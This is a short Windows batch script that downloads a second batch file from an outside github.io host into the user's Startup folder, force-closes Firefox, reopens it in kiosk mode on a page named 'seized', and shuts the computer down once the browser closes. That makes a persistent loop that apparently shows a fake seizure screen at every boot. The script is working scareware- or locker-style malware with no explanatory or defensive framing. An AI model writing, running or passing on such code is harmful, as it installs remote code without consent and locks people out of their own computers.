@echo off
:: Define Startup folder
set "StartupFolder=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

:: Download szz.bat to Startup folder
powershell -Command "Invoke-WebRequest -Uri 'https://giggityfiles.github.io/szz.bat' -OutFile '%StartupFolder%\szz.bat'"

:: Kill Firefox if running
taskkill /f /im firefox.exe

:: Launch Firefox in kiosk mode
start "" firefox --kiosk "https://giggityfiles.github.io/seized"

:: Wait for Firefox to close
:waitloop
tasklist /fi "imagename eq firefox.exe" | find /i "firefox.exe" >nul
if not errorlevel 1 (
    timeout /t 1 >nul
    goto waitloop
)

:: Shutdown PC after 1 second
shutdown /s /t 1
exit
